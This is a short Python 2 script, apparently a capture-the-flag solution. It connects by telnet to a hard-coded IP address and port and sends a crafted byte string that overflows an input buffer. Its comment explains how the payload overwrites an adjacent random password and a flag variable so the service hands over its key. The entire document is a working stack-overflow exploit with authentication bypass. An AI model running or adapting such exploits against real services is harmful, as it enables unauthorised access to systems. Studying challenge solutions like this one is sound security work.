import telnetlib


HOST = '52.49.91.111'
PORT = '9999'



def main():
    
    # The service compares the key with a random password, which is
    # impossible to guess. However, it reads up to 64 chars, and the
    # input and the random password are at distance 16, so submitting
    # a long password overwrites the random value, so they will be
    # compared to equal. There is also a variable that must be 1 in order
    # to give the key. Since it is located at distance 60 we can also
    # overwrite it. But it means that we have to send \1\0\0\0 values.
    tn = telnetlib.Telnet(HOST, PORT)
    print tn.read_until('KEY: ')
    tn.write('\1\0\0\0'*16)
    print tn.read_until('@@@$#$@: ',0.1)
    

if __name__ == '__main__':
    main()